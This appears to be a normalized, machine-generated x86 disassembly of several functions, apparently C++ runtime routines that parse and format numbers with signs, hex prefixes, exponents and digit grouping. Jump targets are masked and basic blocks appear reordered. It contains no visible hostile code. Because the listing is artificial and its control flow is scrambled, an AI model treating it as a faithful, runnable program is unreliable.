mov [ ebp - 0x4 ] 0x1
xor ebx ebx
add esi 0x1f
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx edi
call sub_10038064
cmp al 0x58
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x50 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x50 ] esi
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10037ee7
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_10038064
cmp al [ ebp - 0x4a ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_100023ce
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax [ ebp - 0x54 ]
call sub_10023f1f
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
inc ebx
mov ecx edi
call sub_10037ee7
push [ ebp - 0x5c ]
push edi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_10038bab
push 0x5c
mov eax sub_10047b55
call sub_10023e9c
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
push eax
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x60 ] ebx
call sub_10012b04
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x64 ] ecx
call sub_10005db0
and [ ebp - 0x4 ] 0x0
push ebx
mov ecx esi
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4a ] 0x0
call sub_10037f31
test al al
jne r-xdata
and [ ebp - 0x54 ] 0x0
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
mov ecx esi
call sub_10038064
mov ecx esi
cmp al 0x2b
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_10038064
cmp al 0x2d
jne r-xdata
mov [ edi ] al
jmp r-xdata
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov [ edi ] al
mov ecx esi
inc edi
mov [ ebp - 0x50 ] edi
call sub_10037ee7
push [ ebp - 0x60 ]
push esi
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jl r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp - 0x60 ]
je r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
mov bl al
call sub_10038064
cmp al bl
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10038064
cmp al 0x39
jg r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x55 ] al
call sub_10005ad1
push [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
push esi
xor ebx ebx
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
call sub_100208a9
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_10037ee7
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ ebp - 0x54 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jl r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx esi
call sub_10038064
cmp al 0x30
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10038064
cmp al 0x39
jg r-xdata
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10037ee7
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x5c ]
jmp r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10038064
mov ecx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x54 ]
mov [ ecx ] al
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10037ee7
push [ ebp - 0x60 ]
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100023ce
jmp r-xdata
test ebx ebx
jbe r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp - 0x55 ] 0x0
je r-xdata
cmp [ ebp - 0x54 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
call sub_10038064
cmp al 0x39
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
cmp [ edi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_10038064
cmp al [ ebp - 0x55 ]
jne r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
cmp [ ebp - 0x54 ] 0x24
jge r-xdata
mov edi [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov ecx esi
call sub_10038064
cmp al 0x65
je r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc ebx
jmp r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005af7
inc ebx
mov ecx esi
call sub_10038064
mov ecx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x54 ]
mov [ ecx ] al
cmp [ ebp - 0x54 ] edi
je r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10037ee7
mov ecx esi
call sub_10038064
mov [ edi ] al
inc edi
inc [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi ] 0x0
call sub_100023ce
mov eax [ ebp - 0x5c ]
call sub_10023f1f
retn
mov [ edi ] 0x65
mov ecx esi
inc edi
call sub_10037ee7
and [ ebp - 0x54 ] 0x0
push ebx
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_10037f31
test al al
jne r-xdata
mov ecx esi
call sub_10038064
cmp al 0x45
jne r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_10037ee7
push [ ebp - 0x60 ]
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10038064
mov ecx esi
cmp al 0x2b
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jne r-xdata
call sub_10038064
cmp al 0x2d
jne r-xdata
mov [ edi ] al
jmp r-xdata
mov edi eax
jmp r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10037ee7
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov [ edi ] al
mov ecx esi
inc edi
call sub_10037ee7
mov ecx esi
call sub_10038064
cmp al 0x39
jg r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
cmp [ ebp - 0x54 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10037ee7
mov ecx esi
call sub_10038064
mov [ edi ] al
inc edi
inc [ ebp - 0x54 ]
sub_10039005
push 0x68
mov eax sub_10047b92
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x74 ]
push eax
mov [ ebp - 0x64 ] ecx
call sub_10007b59
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10012b04
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov esi eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x5c ] esi
call sub_10007b41
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10005db0
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x6c ] al
call sub_10007ee2
mov al [ edi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x54 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_100208a9
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push edi
mov [ ebp - 0x50 ] al
mov [ ebp - 0x4f ] 0x65
mov [ ebp - 0x4e ] 0x0
call sub_100208d0
push [ ebp + 0x30 ]
mov esi eax
movsx eax [ ebp - 0x50 ]
push eax
push edi
call sub_100208d0
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x44 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x64 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x44 ]
movsx eax [ ebp - 0x50 ]
push [ ebp + 0x30 ]
push eax
push edi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ ebp - 0x2c ]
push edi
call sub_10007042
cmp esi ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push edi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x6c ]
sub eax edi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_10037fd1
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
push eax
push esi
call sub_10037f70
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x5c ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
push 0x1
mov [ ebp - 0x5c ] al
push [ ebp - 0x5c ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_10037f70
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x60 ]
push eax
push esi
call sub_10037f70
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add edi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_10037f70
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x54 ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_10005af7
jmp r-xdata
push [ ebp - 0x6c ]
lea eax [ ebp - 0x60 ]
push [ ebp + 0x30 ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_10037fd1
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call sub_10037f70
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov edx [ ebp - 0x64 ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x68 ]
mov [ ebp + 0x14 ] eax
push esi
mov [ edx + 0x18 ] ebx
call sub_10037f70
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax [ ebp - 0x68 ]
call sub_10023f1f
retn
push [ ebp - 0x6c ]
sub eax edi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x60 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_10037fd1
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x60 ]
push eax
push esi
call sub_10037f70
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x64 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_10037f9b
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc edi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub esi edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005b45
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
call sub_10005af7
mov [ ebp + 0x24 ] ebx
mov esi [ ebp - 0x4c ]
push 0x30
lea ecx [ ebp - 0x2c ]
cmp esi ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x60 ]
push eax
push esi
call sub_10037f9b
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add edi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
push [ ebp + 0x28 ]
sub esi edi
lea eax [ esi + 0x1 ]
push eax
call sub_10005b45
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10005b45
mov [ ebp + 0x28 ] ebx
push [ ebp + 0x24 ]
call sub_10005af7
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
push eax
call sub_10020980
pop ecx
pop ecx
mov edi eax
jmp r-xdata
lea esi [ ebp - 0x44 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov edi eax
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx edi
sub ecx [ ebp - 0x54 ]
movsx eax al
cmp eax ecx
jae r-xdata
push ebx
sub edi eax
push 0x1
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005b45
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_10039428
push 0x3c
mov eax sub_10047bc7
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx edi
mov [ ebp - 0x3c ] edi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
call sub_10012b04
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
call sub_10007b41
mov ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10005db0
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x30 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov ebx [ edi + 0x18 ]
test ebx ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x30 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor ebx ebx
cmp ebx [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x44 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x40 ] al
push [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10037fd1
mov ecx [ eax ]
mov edx [ ebp - 0x3c ]
push ebx
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ edx + 0x18 ] 0x0
push eax
push ecx
push [ ebp - 0x48 ]
mov [ ebp + 0x14 ] eax
push edi
call sub_10037f70
add esp 0x34
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x48 ]
call sub_10023f1f
retn
cmp eax 0x100
lea eax [ ebp - 0x38 ]
je r-xdata
sub ebx [ ebp + 0x24 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10037f9b
mov ecx [ eax ]
add esi [ ebp - 0x30 ]
push ebx
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x30 ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ ebp - 0x38 ]
push eax
push edi
call sub_10037f70
add esp 0x30
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10037f70
add esp 0x18
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ ebp + 0x14 ] eax
mov edi [ ebp - 0x3c ]
test al al
jle r-xdata
mov edi [ ebp + 0x24 ]
mov ecx edi
sub ecx [ ebp - 0x30 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100203cb
mov eax [ ebp - 0x34 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x34 ]
mov al [ eax ]
cmp al 0x7f
je r-xdata
mov [ ebp - 0x34 ] eax
jmp r-xdata
sub_1003960d
push 0x60
mov eax sub_10047c14
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007b59
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_100388e4
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10007b41
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007b59
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10012b04
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10007b41
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10005ad1
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1003c0be
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10006f9b
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_100023ce
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10005af7
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1003c182
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10006f9b
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_100023ce
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038094
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_100023ce
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_100397ab
push 0x38
mov eax sub_100483df
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100388e4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007b41
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_1001bb94
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_1003987a
push 0x38
mov eax sub_100483df
call sub_10023e9c
